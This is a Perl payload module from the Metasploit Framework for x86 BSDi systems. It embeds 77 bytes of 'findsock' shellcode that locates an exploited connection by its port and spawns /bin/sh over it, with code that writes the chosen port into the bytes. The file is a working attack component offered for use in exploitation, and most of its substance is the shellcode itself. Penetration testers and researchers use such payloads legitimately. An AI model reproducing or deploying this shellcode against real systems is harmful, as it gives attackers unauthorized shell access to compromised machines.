
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdix86_findsock;

use strict;
use base 'Msf::PayloadComponent::FindConnection';

my $info =
{
	'Name'         => 'bsdix86findsock',
	'Version'      => '$Revision$',
	'Description'  => 'Spawn a shell on the established connection',
	'Authors'      => [ 'skape <mmiller [at] hick.org>', 
	                    'optyx <optyx [at] uberhax0r.net>' ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'bsdi' ],
	'Size'         => '',
	'UserOpts'     =>
	{
		'CPORT' => [1, 'PORT', 'Local port used by exploit'],
	}
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };

	$hash = $class->MergeHash($hash, {'Info' => $info});

	my $self = $class->SUPER::new($hash, @_);
	
	$self->_Info->{'Size'} = $self->_GenSize;

	return $self;
}

sub Build 
{
	my $self = shift;

	return $self->Generate($self->GetVar('CPORT'));
}

sub Generate 
{
	my $self = shift;
	my $port = shift;
	my $port_bin = pack('n', $port);
	my $off_port = 41;
 
	my $shellcode = # 77 byte findsock
		"\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe7\x31\xf6" .
		"\x83\xec\x10\x89\xe1\x6a\x10\x89\xe3\x46\x6a\x1f\x58\x53\x51\x56" .
		"\xff\xd7\x83\xc4\x0c\x66\x81\x79\x02\x11\x5c\x75\xec\x6a\x02\x59" .
		"\xb0\x5a\x51\x56\xff\xd7\x49\x79\xf7\x50\x68\x2f\x2f\x73\x68\x68" .
		"\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\xb0\x3b\xff\xd7";
 
	substr($shellcode, $off_port, 2, $port_bin);
  
	return $shellcode;
}

sub _GenSize 
{
	my $self = shift;
	
	return length($self->Generate(4444));
}

1;
